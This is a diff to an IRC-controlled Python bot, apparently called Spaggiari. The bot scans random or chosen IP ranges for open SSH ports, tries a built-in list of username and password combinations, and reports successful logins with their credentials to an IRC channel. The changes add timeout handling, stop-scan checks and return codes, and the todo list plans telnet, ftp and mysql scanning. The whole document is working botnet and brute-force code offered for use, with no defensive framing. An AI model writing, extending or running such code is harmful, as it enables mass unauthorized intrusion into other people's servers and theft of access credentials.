@@ -42,16 +42,12 @@ Commands:
 Note: Commands require either 'all' or the bots unique id after it.
 If the bot has a nick of 'spag-tnnxu', the id of that bot is 'tnnxu'.
 You can issue a command with '@info all', or '@info tnnxu'.
-
-Bugs:
-- The @stop command is not perfect and doesn't fully stop scans in progress.
  
 Todo:
 - Create a more accurate and comprehensive spooky list.
-- Implement scanning for telnet and ftp.
-- Make use of 'deep_combos' after no successful logins.
+- Implement scanning for other services (telnet, ftp, mysql, etc).
+- Allow scanning a specific host using deep_combos.
 - Use pyinstaller to create a single executable.
-- Give up after x amount of timeouts.
 - Slow random scans when idle.
 """
 
@@ -78,9 +74,10 @@ channel  = '#dev'
 key      = None
 
 # Other Config (EDIT)
-admin_host   = 'admin.host'
-control_char = '@'
-throttle     = 20
+admin_host      = 'admin.host'
+control_char    = '@'
+timeout_breaker = 5
+throttle        = 20
 
 # SSH Login Combos
 combos = OrderedDict([
@@ -166,7 +163,7 @@ def debug(msg):
 
 def error(msg, reason=None):
     if reason:
-        print '%s | [!] - %s (%s)' % (get_time(), msg, reason)
+        print '%s | [!] - %s (%s)' % (get_time(), msg, str(reason))
     else:
         print '%s | [!] - %s'      % (get_time(), msg)
 
@@ -284,11 +281,14 @@ class idle_scan(threading.Thread):
         threading.Thread.__init__(self)
     def run(self):
         while True:
-            host = (random_ip())
-            if not check_range(host):
-                ssh_bruteforce(host).start()
-            time.sleep(throttle)
-                
+            if SpaggiariBot.stop_scan:
+                break
+            else:
+                host = (random_ip())
+                if not check_range(host):
+                    ssh_bruteforce(host).start()
+                time.sleep(throttle)
+
 class scan(threading.Thread):
     def __init__(self, ip_range):
         self.ip_range = ip_range
@@ -309,22 +309,32 @@ class scan(threading.Thread):
 
 class ssh_bruteforce(threading.Thread):
     def __init__(self, host):
-        self.host = host
+        self.host     = host
+        self.timeouts = 0
+        self.breaker  = False
         threading.Thread.__init__(self)
     def run(self):
         if check_port(self.host, 22):
             alert('%s has port 22 open.' % self.host)
             for user in combos.keys():
-                if SpaggiariBot.stop_scan:
+                if SpaggiariBot.stop_scan or self.breaker or self.timeouts >= timeout_breaker:
                     break
-                password = combos[user]
-                if type(password) == tuple:
-                    for item in password:
-                        ssh_connect(self.host, user, item)
-                        time.sleep(throttle)
                 else:
-                    ssh_connect(self.host, user, password)
-                    time.sleep(throttle)
+                    password = combos[user]
+                    if type(password) == tuple:
+                        for item in password:
+                            if SpaggiariBot.stop_scan or self.breaker or self.timeouts >= timeout_breaker:
+                                break
+                            else:
+                                result = ssh_connect(self.host, user, item)
+                                if   result == 1 : self.timeouts += 1
+                                elif result == 2 : self.breaker = True
+                                time.sleep(throttle)
+                    else:
+                        result = ssh_connect(self.host, user, password)
+                        if   result == 1 : self.timeouts += 1
+                        elif result == 2 : self.breaker = True
+                        time.sleep(throttle)
         else:
             error('%s does not have port 22 open.' % self.host)
 
@@ -333,27 +343,16 @@ def ssh_connect(hostname, username, password):
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         ssh.connect(hostname, 22, username, password, timeout=10.0)
-    except paramiko.ssh_exception.AuthenticationException:
-        error('Failed to connect to %s using %s:%s (Authentication Error)' % (hostname, username, password))
-        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s'  % (hostname, username, password), 'Authentication Error')
-    except paramiko.ssh_exception.BadHostKeyException:
-        error('Failed to connect to %s using %s:%s (Bad Host Key Exception)' % (hostname, username, password))
-        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s'    % (hostname, username, password), 'Bad Host Key Exception')
-    except paramiko.ssh_exception.SSHException:
-        error('Failed to connect to %s using %s:%s (SSH Exception)'       % (hostname, username, password))
-        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (hostname, username, password), 'SSH Exception')
     except socket.timeout:
-        error('Failed to connect to %s using %s:%s (Timeout)'             % (hostname, username, password, ex))
-        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (hostname, username, password), 'Timeout')
-    except socket.error as ex:
-        error('Failed to connect to %s using %s:%s (%s)'                  % (hostname, username, password, ex))
-        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (hostname, username, password), ex)
+        error('Failed to connect to %s using %s:%s (Timeout)' % (hostname, username, password))
+        return 1
     except Exception as ex:
-        error('Failed to connect to %s using %s:%s (%s)'                  % (hostname, username, password, ex))
-        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (hostname, username, password), ex)
+        error('Failed to connect to %s using %s:%s (%s)' % (hostname, username, password, ex))
+        return 0
     else:
-        alert('Successful connection to %s using %s:%s'                                % (hostname, username, password))
+        alert('Successful connection to %s using %s:%s' % (hostname, username, password))
         SpaggiariBot.sendmsg(channel, '[%s] - Successful connection to %s using %s:%s' % (color('+', green), hostname, username, password))
+        return 2
     finally:
         ssh.close()
 
@@ -452,7 +451,7 @@ class IRC(threading.Thread):
             elif len(args) == 4:
                 if cmd == 'scan' and args[1] == self.id:
                     if not self.scanning:
-                        if len(args) == 4 and args[2] in ('b','c'):
+                        if args[2] in ('b','c'):
                             if args[2] == 'b':
                                 if args[3] == 'random' : range_prefix = '%d.%d' % (random_int(0,255), random_int(0,255))
                                 else                   : range_prefix = args[3]
@@ -470,11 +469,11 @@ class IRC(threading.Thread):
                                     self.scanning = True
                                     scan(targets).start()
                                 else:
-                                    self.error(chan, 'Spooky IP address range.')
+                                    self.error(chan, 'Spooky/Reserved IP address range.')
                             else:
                                 self.error(chan, 'Invalid IP address range.')
                         else:
-                            self.error(chan, 'Missing or invalid arguments.')
+                            self.error(chan, 'Invalid arguments.')
                     else:
                         self.error(chan, 'A scan is already running.')
 
